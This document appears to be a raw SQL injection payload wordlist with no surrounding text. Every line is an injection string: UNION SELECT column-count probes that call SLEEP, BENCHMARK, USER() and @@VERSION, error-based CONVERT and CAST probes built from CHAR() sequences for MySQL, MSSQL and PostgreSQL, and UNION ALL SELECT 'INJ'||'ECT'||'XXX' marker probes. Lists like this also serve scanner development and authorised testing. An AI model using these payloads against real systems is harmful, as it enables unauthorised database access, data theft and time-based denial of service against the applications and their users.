+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT USER()-- 
+ UNION ALL SELECT SLEEP(5)-- 
+ UNION ALL SELECT USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT NULL-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
+ UNION ALL SELECT NULL#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
+ UNION ALL SELECT NULL 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
+ AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
